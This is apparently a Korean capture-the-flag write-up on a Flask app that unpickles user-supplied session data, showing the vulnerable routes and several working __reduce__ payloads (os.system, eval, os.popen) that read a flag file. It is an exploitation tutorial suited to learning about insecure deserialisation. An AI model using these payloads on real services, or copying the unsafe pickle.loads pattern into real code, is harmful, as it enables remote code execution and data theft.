## 코드

```python
@app.route('/create_session', methods=['GET', 'POST'])
def create_session():
    if request.method == 'GET':
        return render_template('create_session.html')
    elif request.method == 'POST':
        info = {}
        for _ in INFO:
            info[_] = request.form.get(_, '')
        data = base64.b64encode(pickle.dumps(info)).decode('utf8')
        return render_template('create_session.html', data=data)

@app.route('/check_session', methods=['GET', 'POST'])
def check_session():
    if request.method == 'GET':
        return render_template('check_session.html')
    elif request.method == 'POST':
        session = request.form.get('session', '')
        info = pickle.loads(base64.b64decode(session))
        return render_template('check_session.html', info=info)
```

## 풀이

pickle의 직렬화 취약점을 활용하는 문제
덕분에 pickle 직렬화 취약점의 동작원리에 대해 알게되었고,

```python
import os
import pickle

class Exploit(object):
    def __reduce__(self):
        command = "id"
        return (os.system, (command, ))

data = pickle.dumps(Exploit())
pickle.loads(data)
```

와 같은 방식으로 RCE를 발생시킬 수 있다는 것을 알게 되었다.
여기서부터는 이제 문제 풀이, 디테일의 영역인데,

일단 문제에서 info의 객체 형태를 지정해주고 있으므로 이를 지켜줘야 하며
즉 pickle.dumps({'name': Exploit()}) 와 같은 방식으로 말이다.

그리고 문제에서는 create_session()에서 dumps를 실행시키는데,
생각해보면 우리가 만든 class를 여기로 전달시킬 방법이 없다.
여기서 쓸데없이 생각을 많이했는데, 생각해보니 그냥 base64 인코딩과 dumps를 내가 다 해서 String 형태로 값을 만들고,
이를 check_session()으로만 전달시키면 되겠다는 것을 깨달았다.

그래서 스크립트를 다음과 같은 방향으로 작성했다.

```python
import os
import pickle
import requests
import base64

class Exploit(object):
    def __reduce__(self):
        command = "cat ./flag.txt"
        return (os.system, (command, ))

body = {
    'name': Exploit()
}

data = base64.b64encode(pickle.dumps(body)).decode('utf8')
print(data)
```

여기서 마지막 디테일은 os.system으로 실행시킨 명령어의 return 값은 명령어 실행의 성공 여부이다.
따라서 기껏 이렇게 잘 실행시켜봤자 0 밖에 안나온다.
그렇기 때문에 os.system 대신 명령어 실행시킨 결과를 바로 받아올 수 있는 방법이 필요하다.

```python
import os
import pickle
import requests
import base64

class Exploit(object):
    def __reduce__(self):
        p = "open('./flag.txt', 'r').read()"
        return (eval, (p, ))

body = {
    'name': Exploit()
}

data = base64.b64encode(pickle.dumps(body)).decode('utf8')
print(data)
```

여기서 eval은 파이썬 스크립트를 인자로 받아 해당 스크립트를 실행시키는 함수이다. 게다가 그 실행 결과를 return 하기 때문에 결과를 바로 확인할 수 있는 것이다.

이런 방법으로 data를 만들고, data를 check_session()에 입력하니 name에 flag 값이 나왔다.

```python
class vul(object):
    def __reduce__(self):
        p = "os.popen('cat ./flag.txt').read()"
        return (eval, (p,))
```

이렇게 os.popen()을 활용해도 할 수 있다고 한다.